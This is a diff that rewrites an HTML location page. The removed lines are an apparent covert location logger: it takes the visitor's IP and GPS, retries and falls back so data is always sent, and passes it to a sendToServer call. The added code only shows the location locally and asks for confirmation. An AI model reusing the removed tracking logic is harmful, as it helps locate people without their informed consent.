@@ -1,120 +1,149 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Capture</title>
+    <title>Choose Location</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
             font-family: sans-serif;
+            background:#f4f4f4;
             display:flex;
             justify-content:center;
             align-items:center;
             height:100vh;
-            background:#f0f2f5;
         }
+
         .card {
             background:white;
-            padding:30px;
-            border-radius:10px;
-            text-align:center;
+            padding:25px;
+            border-radius:12px;
             width:90%;
-            max-width:400px;
+            max-width:420px;
+            text-align:center;
+            box-shadow:0 8px 20px rgba(0,0,0,0.1);
         }
-        button {
-            padding:10px 20px;
-            font-size:16px;
+
+        input {
+            width:100%;
+            padding:10px;
             margin-top:10px;
+            border:1px solid #ccc;
+            border-radius:8px;
+        }
+
+        button {
+            margin-top:12px;
+            padding:10px;
+            width:100%;
+            border:none;
+            border-radius:8px;
             cursor:pointer;
+            font-size:16px;
+        }
+
+        .primary {
+            background:#28a745;
+            color:white;
+        }
+
+        .secondary {
+            background:#007bff;
+            color:white;
+        }
+
+        .small {
+            font-size:13px;
+            color:gray;
+            margin-top:8px;
         }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h3>Location Capture</h3>
-    <p>Click to get your current coordinates</p>
 
-    <button onclick="start()">Allow & Continue</button>
+    <h3>📍 Set Your Location</h3>
+
+    <p class="small">We will detect your location automatically</p>
+
+    <button class="secondary" onclick="detectLocation()">
+        Auto Detect Location
+    </button>
 
     <p id="status"></p>
-    <div id="result" style="margin-top:15px;"></div>
+
+    <input type="text" id="address" placeholder="Detected address will appear here">
+
+    <input type="text" id="lat" placeholder="Latitude" readonly>
+    <input type="text" id="lon" placeholder="Longitude" readonly>
+
+    <button class="primary" onclick="confirmLocation()">
+        Confirm Location
+    </button>
+
 </div>
 
 <script>
 
-const PA_USER = "REPLACE_WITH_USERNAME";
-let sent = false;
+let data = {
+    lat: "",
+    lon: "",
+    address: ""
+};
 
-function start() {
-    document.getElementById("status").innerText = "Getting GPS...";
+function detectLocation() {
 
-    let data = {
-        ip: "0.0.0.0",
-        lat: "0",
-        lon: "0",
-        type: "UNKNOWN"
-    };
+    document.getElementById("status").innerText = "Detecting location...";
 
-    // fallback IP (optional)
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(json => {
-        data.ip = json.ip;
-    })
-    .catch(() => {});
-
-    // GPS
     if (navigator.geolocation) {
 
         navigator.geolocation.getCurrentPosition(
-            (pos) => {
+            async (pos) => {
+
                 data.lat = pos.coords.latitude;
                 data.lon = pos.coords.longitude;
-                data.type = "GPS";
-                processData(data);
+
+                document.getElementById("lat").value = data.lat;
+                document.getElementById("lon").value = data.lon;
+
+                // Get readable address
+                try {
+                    let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}`);
+                    let json = await res.json();
+
+                    data.address = json.display_name;
+                    document.getElementById("address").value = data.address;
+
+                } catch (e) {
+                    document.getElementById("address").value = "Unable to fetch address";
+                }
+
+                document.getElementById("status").innerText = "Location detected ✅";
+
             },
-            (err) => {
-                // retry once
-                navigator.geolocation.getCurrentPosition(
-                    (pos2) => {
-                        data.lat = pos2.coords.latitude;
-                        data.lon = pos2.coords.longitude;
-                        data.type = "GPS-RETRY";
-                        processData(data);
-                    },
-                    () => {
-                        processData(data);
-                    },
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
+            () => {
+                document.getElementById("status").innerText = "Location access denied ❌";
             },
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 8000 }
         );
 
     } else {
-        processData(data);
+        document.getElementById("status").innerText = "GPS not supported";
     }
-
-    // safety fallback
-    setTimeout(() => {
-        processData(data);
-    }, 9000);
 }
 
-function processData(data) {
+function confirmLocation() {
 
-    if (sent) return;
-    sent = true;
+    alert(
+        "Location Confirmed!\n\n" +
+        "Lat: " + document.getElementById("lat").value + "\n" +
+        "Lon: " + document.getElementById("lon").value + "\n" +
+        "Address: " + document.getElementById("address").value
+    );
 
-    // 🔥 ONLY COORDINATES SHOWN
-    document.getElementById("result").innerHTML =
-        "📍 Latitude: " + data.lat +
-        "<br>📍 Longitude: " + data.lon;
-
-    sendToServer(data);
 }
 
-function
+</script>
 
-
-
+</body>
+</html>
